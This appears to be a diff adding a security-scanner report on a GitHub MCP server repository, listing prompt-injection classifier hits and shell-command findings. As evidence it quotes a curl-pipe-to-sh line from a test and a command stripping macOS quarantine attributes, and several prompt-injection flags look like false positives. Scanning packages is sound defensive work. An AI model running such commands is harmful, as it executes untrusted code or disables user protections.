@@ -1,0 +1,152 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Codenator81/relaybay",
+    "version": "fc17218b286b9a923025333a92d8262ca9524108",
+    "download": "https://codeload.github.com/Codenator81/relaybay/tar.gz/fc17218b286b9a923025333a92d8262ca9524108"
+  },
+  "archive_sha256": "bc3a297b7cfca252c1a94178f0a420905e909ffe9cc1839c87c0c675d4f8e778",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/src/relaybay/policy/schema.json",
+      "line": 16,
+      "evidence": "p=0.98 A note for people; ignored.",
+      "file_sha256": "ee00bd6bd93d432fe4a48306f698d2a32541add2e71d738d918c0ed502bb3426"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/src/relaybay/policy/schema.json",
+      "line": 65,
+      "evidence": "p=0.98 Ignore patterns to add.",
+      "file_sha256": "ee00bd6bd93d432fe4a48306f698d2a32541add2e71d738d918c0ed502bb3426"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/src/relaybay/policy/schema.json",
+      "line": 66,
+      "evidence": "p=0.91 Ignore patterns to remove.",
+      "file_sha256": "ee00bd6bd93d432fe4a48306f698d2a32541add2e71d738d918c0ed502bb3426"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/docs/reference/policy.schema.json",
+      "line": 16,
+      "evidence": "p=0.98 A note for people; ignored.",
+      "file_sha256": "7218fcc00ff6bef3fd42598e58bd072e71bca857fc6c85dd2e9ac9f8c17c0ffd"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/docs/reference/policy.schema.json",
+      "line": 135,
+      "evidence": "p=0.98 Ignore patterns to add.",
+      "file_sha256": "7218fcc00ff6bef3fd42598e58bd072e71bca857fc6c85dd2e9ac9f8c17c0ffd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/docs/reference/policy.schema.json",
+      "line": 139,
+      "evidence": "p=0.91 Ignore patterns to remove.",
+      "file_sha256": "7218fcc00ff6bef3fd42598e58bd072e71bca857fc6c85dd2e9ac9f8c17c0ffd"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/docs/getting-started/install.md",
+      "line": 31,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "3b5eb7f1d2fe80f2c6b6dcd8539cec3bad1864304617cbdff27801cf17a1938c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/docs/SPEC.md",
+      "line": 3873,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "7a171c46160aed32b210c1bca1061cdfb2f8eda1e21fe0828a09b8a9b19a725a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/tests/test_approvals.py",
+      "line": 587,
+      "evidence": "curl https://x.invalid/i.sh | sh",
+      "file_sha256": "0a75910d46ce28828a4e8648a6c1b3bfabce5b33347afe65ebcfacbbf50d1848"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "relaybay-fc17218b286b9a923025333a92d8262ca9524108/README.md",
+      "line": 78,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "9712822f6efdbc7bc52088cdf8c5111bde0a326eb9e1920e09c94c22a00ff125"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "192.168.1.20",
+    "192.168.1.5",
+    "a.example.com",
+    "api.github.com",
+    "b.lan",
+    "board.example",
+    "board.example.lan",
+    "board.lan",
+    "claude.ai",
+    "code.claude.com",
+    "codenator81.github.io",
+    "docs.astral.sh",
+    "evil.example",
+    "evil.example.com",
+    "example.com",
+    "files.pythonhosted.org",
+    "git.example.com",
+    "github.com",
+    "gitlab.com",
+    "host.com",
+    "img.shields.io",
+    "jrsoftware.org",
+    "json-schema.org",
+    "json.schemastore.org",
+    "keepachangelog.com",
+    "my-laptop.lan",
+    "objects.githubusercontent.com",
+    "other.example.com",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "semver.org",
+    "shop.example.com",
+    "shop.test",
+    "staging.acme-shop.example",
+    "t.example",
+    "test.example.com",
+    "tracker.example",
+    "tracker.example.com",
+    "www.contributor-covenant.org",
+    "www.conventionalcommits.org",
+    "www.w3.org",
+    "x.example.com",
+    "x.invalid",
+    "x.test"
+  ],
+  "install_script": false,
+  "score": "high"
+}
